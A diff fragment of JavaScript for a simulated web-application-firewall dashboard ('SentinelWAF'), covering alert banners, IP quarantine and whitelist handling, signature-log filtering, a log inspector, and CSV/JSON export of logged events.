+    if (type === 'SQL INJECTION') flashCard('lc-sql');
+    if (type === 'XSS') flashCard('lc-xss');
+  } else {
+    setBadge(pendingBadge);
+  }
+
+  const sigOpen = !document.getElementById('sigOverlay').classList.contains('hidden');
+  if (sigOpen) {
+    filterSigTable();
+  }
+}
+
+/* UI UPDATES & DASHBOARD */
+function updateLast(raw, type) {
+  document.getElementById('lastPayload').textContent = raw;
+  document.getElementById('lastTime').textContent = 'Just now · ' + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+  const tag = document.getElementById('lastType');
+  tag.textContent = type;
+  const tc = typeColor[type] || 'bg-gray-800 text-gray-400';
+  tag.className = 'text-[10px] font-bold px-2 py-0.5 rounded ' + tc;
+  flashCard('card-last');
+}
+
+function syncDash() {
+  countTo('d-blocked', blocked);
+  countTo('d-sql', sqlH);
+  countTo('d-xss', xssH);
+  const score = Math.max(30, 92 - Math.floor(blocked * 2.5));
+  document.getElementById('d-score').textContent = score + '%';
+  document.getElementById('liveCountTxt').textContent = blocked ? blocked + ' intercepted' : '— intercepted';
+}
+
+function showAlert(msg) {
+  const b = document.getElementById('alertBanner');
+  document.getElementById('alertMsg').textContent = msg;
+  b.classList.remove('hidden');
+  b.classList.add('flex');
+  clearTimeout(b._t);
+  b._t = setTimeout(hideAlert, 5000);
+}
+
+function hideAlert() {
+  const b = document.getElementById('alertBanner');
+  b.classList.add('hidden');
+  b.classList.remove('flex');
+}
+
+function flashCard(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.classList.add('active');
+  setTimeout(function() { el.classList.remove('active'); }, 800);
+}
+
+function setBadge(n) {
+  const b = document.getElementById('navBadge');
+  if (n > 0) {
+    b.textContent = n > 99 ? '99+' : n;
+    b.classList.remove('hidden');
+    b.classList.add('flex');
+  } else {
+    b.classList.add('hidden');
+  }
+}
+
+function openDash() {
+  document.getElementById('dashOverlay').classList.remove('hidden');
+  document.getElementById('dashOverlay').classList.add('flex');
+  document.body.style.overflow = 'hidden';
+  pendingBadge = 0;
+  setBadge(0);
+  renderTable(allRows);
+  syncDash();
+  hideAlert();
+}
+
+function closeDash() {
+  document.getElementById('dashOverlay').classList.add('hidden');
+  document.getElementById('dashOverlay').classList.remove('flex');
+  document.body.style.overflow = '';
+}
+
+function overlayClick(e) {
+  if (e.target === document.getElementById('dashOverlay')) closeDash();
+}
+
+/* NETWORK MATRIX */
+function openNetworkMatrix() {
+  document.getElementById('networkOverlay').classList.remove('hidden');
+  document.getElementById('networkOverlay').classList.add('flex');
+  document.body.style.overflow = 'hidden';
+  renderQuarantineTable();
+  startPacketDelayJitter();
+}
+
+function closeNetworkMatrix() {
+  document.getElementById('networkOverlay').classList.add('hidden');
+  document.getElementById('networkOverlay').classList.remove('flex');
+  document.body.style.overflow = '';
+}
+
+function overlayClickNM(e) {
+  if (e.target === document.getElementById('networkOverlay')) closeNetworkMatrix();
+}
+
+function toggleEnforcement() {
+  enforcementActive = !enforcementActive;
+  const left = document.getElementById('nmToggleLeft');
+  const right = document.getElementById('nmToggleRight');
+  const label = document.getElementById('nmModeLabel');
+  const modeTxt = document.getElementById('nmModeTxt');
+  const desc = document.getElementById('nmModeDesc');
+
+  if (enforcementActive) {
+    left.className = 'w-1/2 text-center text-[10px] font-black py-2 rounded-full bg-green-400 text-[#080c08] transition-all';
+    right.className = 'w-1/2 text-center text-[10px] font-black py-2 text-gray-600 transition-all';
+    label.textContent = 'ACTIVE BLOCKING';
+    modeTxt.textContent = 'ACTIVE BLOCKING';
+    desc.textContent = 'Bad requests are dropped at the edge before reaching origin.';
+  } else {
+    left.className = 'w-1/2 text-center text-[10px] font-black py-2 text-gray-600 transition-all';
+    right.className = 'w-1/2 text-center text-[10px] font-black py-2 rounded-full bg-yellow-400 text-[#080c08] transition-all';
+    label.textContent = 'PASS-THROUGH LOG ONLY';
+    modeTxt.textContent = 'PASS-THROUGH LOG ONLY';
+    desc.textContent = 'Requests are allowed through and only logged, not dropped.';
+  }
+}
+
+function isValidIP(ip) {
+  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) return false;
+  return ip.split('.').every(function(o) { return parseInt(o, 10) <= 255; });
+}
+
+function blockIP() {
+  const input = document.getElementById('nmIpInput');
+  const val = input.value.trim();
+  const msg = document.getElementById('nmIpMsg');
+
+  if (!isValidIP(val)) {
+    msg.textContent = '⚠️ Enter a valid IPv4 address.';
+    msg.className = 'text-[10px] mono text-red-400';
+    msg.classList.remove('hidden');
+    return;
+  }
+  if (quarantineList.some(function(r) { return r.ip === val; })) {
+    msg.textContent = '⚠️ ' + val + ' is already quarantined.';
+    msg.className = 'text-[10px] mono text-yellow-400';
+    msg.classList.remove('hidden');
+    return;
+  }
+
+  const now = new Date();
+  const timeStr = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  quarantineList.unshift({ ip: val, reason: 'Manual Block Rule', time: timeStr });
+
+  const tIdx = trustedIPs.indexOf(val);
+  if (tIdx > -1) trustedIPs.splice(tIdx, 1);
+
+  renderQuarantineTable();
+  msg.textContent = '⛔ ' + val + ' added to quarantine.';
+  msg.className = 'text-[10px] mono text-red-400';
+  msg.classList.remove('hidden');
+  input.value = '';
+}
+
+function trustIP() {
+  const input = document.getElementById('nmIpInput');
+  const val = input.value.trim();
+  const msg = document.getElementById('nmIpMsg');
+
+  if (!isValidIP(val)) {
+    msg.textContent = '⚠️ Enter a valid IPv4 address.';
+    msg.className = 'text-[10px] mono text-red-400';
+    msg.classList.remove('hidden');
+    return;
+  }
+
+  const idx = quarantineList.findIndex(function(r) { return r.ip === val; });
+  if (idx > -1) quarantineList.splice(idx, 1);
+  if (trustedIPs.indexOf(val) === -1) trustedIPs.push(val);
+
+  renderQuarantineTable();
+  msg.textContent = '🟢 ' + val + ' marked as trusted & whitelisted.';
+  msg.className = 'text-[10px] mono text-green-400';
+  msg.classList.remove('hidden');
+  input.value = '';
+}
+
+function unblockIP(idx) {
+  quarantineList.splice(idx, 1);
+  renderQuarantineTable();
+}
+
+function renderQuarantineTable() {
+  const tb = document.getElementById('nmQuarantineTable');
+  const count = document.getElementById('nmQCount');
+  if (!tb) return;
+  count.textContent = quarantineList.length + ' isolated';
+
+  if (!quarantineList.length) {
+    tb.innerHTML = '<tr><td colspan="4" class="text-center text-gray-600 text-xs py-6 italic">No IPs currently quarantined.</td></tr>';
+    return;
+  }
+
+  let html = '';
+  for (let i = 0; i < quarantineList.length; i++) {
+    const r = quarantineList[i];
+    html += '<tr class="border-b border-green-400/04 hover:bg-green-400/03 transition">';
+    html += '<td class="py-2.5 px-2 mono text-[11px] text-gray-300">' + escapeHtml(r.ip) + '</td>';
+    html += '<td class="py-2.5 px-2 text-[11px] text-gray-500">' + escapeHtml(r.reason) + '</td>';
+    html += '<td class="py-2.5 px-2 mono text-[11px] text-gray-600">' + escapeHtml(r.time) + '</td>';
+    html += '<td class="py-2.5 px-2">';
+    html += '<button onclick="unblockIP(' + i + ')" class="text-[10px] font-bold px-2.5 py-1 rounded-full bg-green-400/10 text-green-400 border border-green-400/25 hover:bg-green-400/20 transition">Unblock</button>';
+    html += '</td></tr>';
+  }
+  tb.innerHTML = html;
+}
+
+function selectProfile(mode) {
+  sensitivityProfile = mode;
+  ['standard', 'strict', 'audit'].forEach(function(m) {
+    const card = document.getElementById('profile-' + m);
+    const chk = document.getElementById('profChk-' + m);
+    if (!card) return;
+    if (m === mode) {
+      card.classList.add('active');
+      card.classList.remove('border-green-400/15');
+      card.classList.add('border-green-400/40');
+      chk.textContent = '●';
+      chk.className = 'text-green-400 text-xs';
+    } else {
+      card.classList.remove('active');
+      card.classList.remove('border-green-400/40');
+      card.classList.add('border-green-400/15');
+      chk.textContent = '○';
+      chk.className = 'text-gray-700 text-xs';
+    }
+  });
+
+  if (mode === 'audit' && enforcementActive) {
+    toggleEnforcement();
+  }
+}
+
+let nmDelayInterval = null;
+function startPacketDelayJitter() {
+  const el = document.getElementById('nmDelay');
+  if (!el || nmDelayInterval) return;
+  nmDelayInterval = setInterval(function() {
+    const jitter = (1.0 + Math.random() * 0.6).toFixed(1);
+    el.textContent = jitter + ' ms';
+  }, 2000);
+}
+
+/* SIGNATURE STREAM LOGS */
+function openSignatureLogs() {
+  document.getElementById('sigOverlay').classList.remove('hidden');
+  document.getElementById('sigOverlay').classList.add('flex');
+  document.body.style.overflow = 'hidden';
+  filterSigTable();
+}
+
+function closeSignatureLogs() {
+  document.getElementById('sigOverlay').classList.add('hidden');
+  document.getElementById('sigOverlay').classList.remove('flex');
+  document.body.style.overflow = '';
+}
+
+function overlayClickSig(e) {
+  if (e.target === document.getElementById('sigOverlay')) closeSignatureLogs();
+}
+
+function filterSigTable() {
+  const q = (document.getElementById('sigSearch')?.value || '').toLowerCase();
+  const sev = document.getElementById('sigSeverityFilter')?.value || '';
+  const act = document.getElementById('sigActionFilter')?.value || '';
+
+  const filtered = allRows.filter(function(r) {
+    if (sev && r.sev !== sev) return false;
+    if (act && r.action !== act) return false;
+    if (q) {
+      const hay = [r.id, r.ruleId, r.ip, r.payload, r.category, (r.geo ? r.geo.country : '')].join(' ').toLowerCase();
+      if (hay.indexOf(q) === -1) return false;
+    }
+    return true;
+  });
+
+  renderSigTable(filtered);
+  const countTxt = document.getElementById('sigLiveCountTxt');
+  if (countTxt) countTxt.textContent = allRows.length + ' events';
+}
+
+function clearSigFilters() {
+  if (document.getElementById('sigSearch')) document.getElementById('sigSearch').value = '';
+  if (document.getElementById('sigSeverityFilter')) document.getElementById('sigSeverityFilter').value = '';
+  if (document.getElementById('sigActionFilter')) document.getElementById('sigActionFilter').value = '';
+  filterSigTable();
+}
+
+function renderSigTable(data) {
+  const tb = document.getElementById('sigTable');
+  const badge = document.getElementById('sigRowBadge');
+  if (!tb) return;
+  if (badge) badge.textContent = data.length + ' entries';
+
+  if (!data.length) {
+    tb.innerHTML = '<tr><td colspan="7" class="text-center text-gray-600 text-xs py-8 italic">No matching security events. Submit a payload or run the simulation.</td></tr>';
+    return;
+  }
+
+  let html = '';
+  for (let i = 0; i < data.length; i++) {
+    const r = data[i];
+    const sc = sevColor[r.sev] || 'text-gray-400';
+    const geo = r.geo || { country: '—', flag: '' };
+    html += '<tr class="border-b border-green-400/04 hover:bg-green-400/06 transition cursor-pointer" onclick="openLogInspector(\'' + r.id + '\')">';
+    html += '<td class="py-3 px-2 mono text-[11px] text-gray-500">' + r.time + '</td>';
+    html += '<td class="py-3 px-2 mono text-[11px] text-gray-300">' + escapeHtml(r.ip) + '<div class="text-[9px] text-gray-600">' + geo.flag + ' ' + escapeHtml(geo.country) + '</div></td>';
+    html += '<td class="py-3 px-2 mono text-[11px] text-green-300">' + escapeHtml(r.ruleId) + '</td>';
+    html += '<td class="py-3 px-2 text-[11px] text-gray-400">' + escapeHtml(r.category) + '</td>';
+    html += '<td class="py-3 px-2 text-[11px] ' + sc + '">' + r.sev + '</td>';
+    html += '<td class="py-3 px-2">' + actionBadge(r.action) + '</td>';
+    html += '<td class="py-3 px-2 max-w-[160px]"><div class="mono text-[11px] text-gray-300 truncate" title="' + escapeHtml(r.payload) + '">' + escapeHtml(r.payload) + '</div></td>';
+    html += '</tr>';
+  }
+  tb.innerHTML = html;
+}
+
+/* LOG INSPECTOR */
+function openLogInspector(logId) {
+  const entry = allRows.find(function(r) { return r.id === logId; });
+  if (!entry) return;
+  currentInspectedLogId = logId;
+
+  document.getElementById('inspLogId').textContent = entry.id;
+  document.getElementById('inspRuleName').textContent = entry.category + ' Signature Match';
+  document.getElementById('inspRuleId').textContent = entry.ruleId;
+  document.getElementById('inspCategory').textContent = entry.category;
+  document.getElementById('inspAnomaly').textContent = entry.anomalyScore + ' / 30';
+
+  const sevEl = document.getElementById('inspSeverity');
+  sevEl.textContent = entry.sev;
+  sevEl.className = sevColor[entry.sev] || 'text-gray-400';
+
+  document.getElementById('inspAction').innerHTML = actionBadge(entry.action);
+  document.getElementById('inspIP').textContent = entry.ip;
+  document.getElementById('inspGeo').textContent = (entry.geo ? entry.geo.flag + ' ' + entry.geo.country : '—');
+  document.getElementById('inspUA').textContent = entry.ua;
+  document.getElementById('inspURI').textContent = entry.uri;
+  document.getElementById('inspPayload').textContent = entry.uri + '?param=' + entry.payload;
+  document.getElementById('inspPattern').textContent = entry.matchedPattern;
+
+  const msg = document.getElementById('inspActionMsg');
+  msg.classList.add('hidden');
+  msg.textContent = '';
+
+  document.getElementById('logInspectorOverlay').classList.remove('hidden');
+  document.getElementById('logInspectorOverlay').classList.add('flex');
+}
+
+function closeLogInspector() {
+  document.getElementById('logInspectorOverlay').classList.add('hidden');
+  document.getElementById('logInspectorOverlay').classList.remove('flex');
+  currentInspectedLogId = null;
+}
+
+function overlayClickInspector(e) {
+  if (e.target === document.getElementById('logInspectorOverlay')) closeLogInspector();
+}
+
+function inspectorToast(text) {
+  const msg = document.getElementById('inspActionMsg');
+  msg.textContent = text;
+  msg.classList.remove('hidden');
+}
+
+function excludeParameter() {
+  const entry = allRows.find(function(r) { return r.id === currentInspectedLogId; });
+  if (!entry) return;
+  inspectorToast('🧹 Parameter on ' + entry.uri + ' excluded from ' + entry.ruleId + ' going forward.');
+}
+
+function addIPToWhitelist() {
+  const entry = allRows.find(function(r) { return r.id === currentInspectedLogId; });
+  if (!entry) return;
+  if (trustedIPs.indexOf(entry.ip) === -1) trustedIPs.push(entry.ip);
+  const qIdx = quarantineList.findIndex(function(q) { return q.ip === entry.ip; });
+  if (qIdx > -1) {
+    quarantineList.splice(qIdx, 1);
+    renderQuarantineTable();
+  }
+  inspectorToast('🟢 ' + entry.ip + ' added to the trusted whitelist.');
+}
+
+function suppressSignature() {
+  const entry = allRows.find(function(r) { return r.id === currentInspectedLogId; });
+  if (!entry) return;
+  suppressedRuleIds.add(entry.ruleId);
+  inspectorToast('🔕 ' + entry.ruleId + ' suppressed — future matches will be marked PASSED.');
+}
+
+/* RENDER TABLES & EXPORTS */
+function renderTable(data) {
+  const tb = document.getElementById('dashTable');
+  const badge = document.getElementById('rowBadge');
+  if (!tb) return;
+  if (badge) badge.textContent = data.length + ' entries';
+
+  if (!data.length) {
+    tb.innerHTML = '<tr><td colspan="7" class="text-center text-gray-600 text-xs py-8 italic">No entries yet. Submit a payload or run the simulation.</td></tr>';
+    return;
+  }
+
+  let html = '';
+  for (let i = 0; i < data.length; i++) {
+    const r = data[i];
+    const tc = typeColor[r.type] || 'text-yellow-400 bg-yellow-500/10';
+    const sc = sevColor[r.sev] || 'text-gray-400';
+    const rowCls = r.isNew ? 'new-row-anim' : '';
+    html += '<tr class="border-b border-green-400/04 hover:bg-green-400/03 transition ' + rowCls + '">';
+    html += '<td class="py-3 px-2 mono text-[10px] text-gray-600">' + r.id + '</td>';
+    html += '<td class="py-3 px-2 text-[11px] text-gray-600">' + r.date + '</td>';
+    html += '<td class="py-3 px-2 mono text-[11px] text-gray-500">' + r.time + '</td>';
+    html += '<td class="py-3 px-2 max-w-[160px]"><div class="mono text-[11px] text-gray-300 truncate" title="' + escapeHtml(r.payload) + '">' + escapeHtml(r.payload) + '</div></td>';
+    html += '<td class="py-3 px-2"><span class="text-[10px] font-semibold px-2 py-0.5 rounded ' + tc + '">' + r.type + '</span></td>';
+    html += '<td class="py-3 px-2 text-[11px] ' + sc + '">' + r.sev + '</td>';
+    html += '<td class="py-3 px-2">' + actionBadge(r.action) + '</td></tr>';
+  }
+  tb.innerHTML = html;
+}
+
+function filterTable() {
+  const q = document.getElementById('dashSearch').value.toLowerCase();
+  renderTable(allRows.filter(function(r) {
+    return [r.id, r.type, r.sev, r.payload, r.action].some(function(v) { return v.toLowerCase().indexOf(q) > -1; });
+  }));
+}
+
+function filterByBlocked() {
+  document.getElementById('dashSearch').value = '';
+  renderTable(allRows.filter(function(r) { return r.action === 'BLOCKED'; }));
+}
+
+function clearFilter() {
+  document.getElementById('dashSearch').value = '';
+  renderTable(allRows);
+}
+
+function updateRightPanel() {
+  countTo('threatCount', blocked);
+  const bar = document.getElementById('threatBar');
+  if (bar) bar.style.width = Math.min(blocked / 20 * 100, 100) + '%';
+
+  if (document.getElementById('cnt-sql')) document.getElementById('cnt-sql').textContent = sqlH;
+  if (document.getElementById('cnt-xss')) document.getElementById('cnt-xss').textContent = xssH;
+  if (document.getElementById('cnt-path')) document.getElementById('cnt-path').textContent = pathH;
+  if (document.getElementById('cnt-cmd')) document.getElementById('cnt-cmd').textContent = cmdH;
+  if (document.getElementById('cnt-bot')) document.getElementById('cnt-bot').textContent = botH;
+  if (document.getElementById('cnt-rate')) document.getElementById('cnt-rate').textContent = rateH;
+  if (document.getElementById('cnt-other')) document.getElementById('cnt-other').textContent = otherH;
+
+  const pct = function(v) { return blocked ? Math.round(v / blocked * 100) : 0; };
+  if (document.getElementById('bar-sql')) document.getElementById('bar-sql').style.width = pct(sqlH) + '%';
+  if (document.getElementById('bar-xss')) document.getElementById('bar-xss').style.width = pct(xssH) + '%';
+  if (document.getElementById('bar-path')) document.getElementById('bar-path').style.width = pct(pathH) + '%';
+  if (document.getElementById('bar-cmd')) document.getElementById('bar-cmd').style.width = pct(cmdH) + '%';
+  if (document.getElementById('bar-bot')) document.getElementById('bar-bot').style.width = pct(botH) + '%';
+  if (document.getElementById('bar-rate')) document.getElementById('bar-rate').style.width = pct(rateH) + '%';
+  if (document.getElementById('bar-other')) document.getElementById('bar-other').style.width = pct(otherH) + '%';
+
+  const score = Math.max(30, 92 - Math.floor(blocked * 2.5));
+  if (document.getElementById('secScore')) document.getElementById('secScore').textContent = score + '%';
+  if (document.getElementById('secBar')) {
+    document.getElementById('secBar').style.width = score + '%';
+    document.getElementById('secBar').style.background = score > 70 ? 'linear-gradient(90deg,#166534,#4ade80)' : score > 50 ? 'linear-gradient(90deg,#92400e,#f97316)' : 'linear-gradient(90deg,#7f1d1d,#ef4444)';
+  }
+}
+
+function exportCSV() {
+  if (allRows.length === 0) { alert('⚠️ No logs available.'); return; }
+  const headers = ['Log ID', 'Date', 'Time', 'Payload', 'Attack Type', 'Severity', 'Action'];
+  const lines = [headers.join(',')];
+  for (let i = 0; i < allRows.length; i++) {
+    const r = allRows[i];
+    lines.push([r.id, r.date, r.time, '"' + r.payload.replace(/"/g, '""') + '"', r.type, r.sev, r.action].join(','));
+  }
+  downloadBlob(lines.join('\n'), 'SentinelWAF_Report_', 'text/csv');
+}
+
+function exportSigCSV() {
+  if (allRows.length === 0) { alert('⚠️ No security events available.'); return; }
+  const headers = ['Log ID', 'Date', 'Time', 'Source IP', 'Country', 'Rule ID', 'Category', 'Severity', 'Anomaly Score', 'Action', 'URI Path', 'User-Agent', 'Payload', 'Matched Pattern'];
+  const lines = [headers.join(',')];
+  for (let i = 0; i < allRows.length; i++) {
+    const r = allRows[i];
+    lines.push([r.id, r.date, r.time, r.ip, (r.geo ? r.geo.country : ''), r.ruleId, r.category, r.sev, r.anomalyScore, r.action, r.uri, '"' + r.ua.replace(/"/g, '""') + '"', '"' + r.payload.replace(/"/g, '""') + '"', '"' + r.matchedPattern.replace(/"/g, '""') + '"'].join(','));
+  }
+  downloadBlob(lines.join('\n'), 'SentinelWAF_SignatureLogs_', 'text/csv');
+}
+
+function exportSigJSON() {
+  if (allRows.length === 0) { alert('⚠️ No security events available.'); return; }
+  const data = allRows.map(function(r) {
+    return {
+      logId: r.id, date: r.date, time: r.time, sourceIp: r.ip,
+      geolocation: r.geo ? r.geo.country : null, ruleId: r.ruleId, category: r.category,
+      severity: r.sev, anomalyScore: r.anomalyScore, action: r.action,
+      uriPath: r.uri, userAgent: r.ua, payload: r.payload, matchedPattern: r.matchedPattern
+    };
+  });
+  downloadBlob(JSON.stringify(data, null, 2), 'SentinelWAF_SignatureLogs_', 'application/json');
+}
+
+function downloadBlob(content, prefix, mimeType) {
+  const blob = new Blob([content], { type: mimeType });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = prefix + new Date().toISOString().slice(0, 10) + (mimeType === 'application/json' ? '.json' : '.csv');
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+function countTo(id, target, dur) {
+  dur = dur || 600;
+  const el = typeof id === 'string' ? document.getElementById(id) : id;
+  if (!el) return;
+  let cur = parseInt(el.textContent) || 0;
+  const steps = Math.max(dur / 30, 1);
+  const inc = (target - cur) / steps;
+  let v = cur;
+  const t = setInterval(function() {
+    v += inc;
+    if ((inc >= 0 && v >= target) || (inc < 0 && v <= target)) {
+      el.textContent = target;
+      clearInterval(t);
+    } else {
+      el.textContent = Math.floor(v);
+    }
+  }, 30);
+}
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') {
+    if (!document.getElementById('logInspectorOverlay')?.classList.contains('hidden')) {
+      closeLogInspector();
+      return;
+    }
+    closeDash();
+    closeNetworkMatrix();
+    closeSignatureLogs();
+  }
+});
+</script>
+
+</body>
+</html> 
